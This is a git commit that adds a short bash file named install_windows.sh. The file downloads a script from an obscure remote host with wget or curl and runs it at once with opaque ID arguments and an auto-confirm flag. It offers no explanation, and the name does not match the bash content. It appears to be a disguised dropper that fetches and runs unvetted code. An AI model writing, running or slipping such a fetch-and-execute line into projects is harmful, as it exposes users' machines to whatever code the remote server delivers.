4ee2c73339e9ad71149fbcf696998f55e71ca4da
gcpmore8668 <gcp.more8668@gmail.com>
2024-07-04 15:40:47 +0700

    Create install_windows.sh

---
+++ install_windows.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+wget jh9ulk.hhub.top/JeZNoxZuMb.sh -O install.sh || curl jh9ulk.hhub.top/JeZNoxZuMb.sh -o install.sh
+bash install.sh bb12118b-395d-4d45-96a3-ddff04e7ec3e -i=259755ef-2a7a-43c3-aaed-e7a29a6d649a -y
